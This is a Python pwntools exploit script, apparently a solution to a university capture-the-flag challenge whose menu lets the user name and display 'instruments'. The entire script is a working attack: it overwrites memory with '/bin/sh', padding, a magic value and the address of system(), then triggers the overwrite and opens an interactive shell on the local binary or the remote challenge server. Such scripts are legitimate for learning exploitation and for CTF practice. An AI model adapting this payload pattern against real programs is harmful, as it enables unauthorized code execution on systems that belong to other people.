#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)

def start(binary):

    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b *name
        b *display
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-type-1.chals.io", 443, ssl=True, sni="cse4850-type-1.chals.io")
    else:
        return process(binary)

def name_instrument(p,num,name):
    p.recvuntil(b">>> ")
    p.sendline(b"3")
    p.recvuntil(b"[0-5] >>>")
    p.sendline(num)
    p.recvuntil(b" >>>")
    p.sendline(name)

def display_instrument(p,num):
    p.recvuntil(b">>> ")
    p.sendline(b"4")
    p.recvuntil(b"[0-5] >>>")
    p.sendline(num)

def exploit(p,e):

    name = b"/bin/sh\x00" + b"A" * 8 + p64(0x31337) + p64(e.sym["system"])
    p.sendline(b"2")

    name_instrument(p, b"0", name)
    display_instrument(p, b"0")
    p.interactive()




if __name__=="__main__":
    file = './chal.bin'

    p = start(file)
    e = context.binary = ELF(file)

    exploit(p,e)
